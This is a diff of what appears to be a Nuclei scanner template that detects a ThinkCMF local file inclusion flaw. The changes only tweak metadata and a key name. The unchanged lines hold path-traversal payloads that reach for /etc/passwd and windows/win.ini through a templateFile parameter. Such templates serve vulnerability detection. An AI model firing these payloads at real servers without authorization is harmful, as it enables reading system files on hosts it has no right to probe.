@@ -8,7 +8,6 @@ info:
   reference:
     - https://www.freebuf.com/vuls/217586.html
   metadata:
-    max-request: 1
     win-payload: ../../../../../../../../../../../../../../../../windows/win.ini
     unix-payload: ../../../../../../../../../../../../../../../../etc/passwd
   classification:
@@ -17,7 +16,7 @@ info:
     cwe-id: CWE-22
   tags: thinkcmf,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/?a=display&templateFile=README.md"
